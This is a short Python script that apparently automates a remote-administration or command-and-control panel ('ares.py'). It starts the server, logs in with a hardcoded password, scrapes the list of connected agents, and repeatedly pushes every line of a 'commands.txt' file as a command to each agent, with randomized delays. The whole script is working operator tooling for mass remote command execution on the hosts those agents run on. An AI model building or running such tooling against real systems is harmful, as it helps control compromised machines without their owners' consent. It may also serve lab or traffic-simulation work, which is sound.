#!/usr/bin/env python

import subprocess
import requests
import re
from random import randint
from time import sleep

full_command = "./ares.py runserver -h 0.0.0.0 -p 8080 --threaded"
subprocess.Popen(full_command, shell=True, close_fds=True)

sleep(10)

base_url = 'http://localhost:8080'

while True:
    url = base_url + '/login'
    myobj = {'password': 'test'}
    
    requests.post(url, data = myobj)
    x = requests.post(url, data = myobj)
    
    cookies = x.cookies
    
    url = base_url + '/agents'
    x = requests.get(url, cookies=cookies)
    
    matches = re.findall(r"checkbox_root_\d{13}", x.text)
    agents = []
    for match in matches:
        agents.append(match.replace("checkbox_",""))
        
    cmds_file = open('commands.txt', 'r') 
    lines = cmds_file.read().splitlines()

    for line in lines:
        for agent in agents:
            url = base_url + '/api/' + agent + '/push'
            myobj = {'cmdline': line}
            sleep(randint(1,5))
            requests.post(url, data=myobj, cookies=cookies)

    sleep(10)
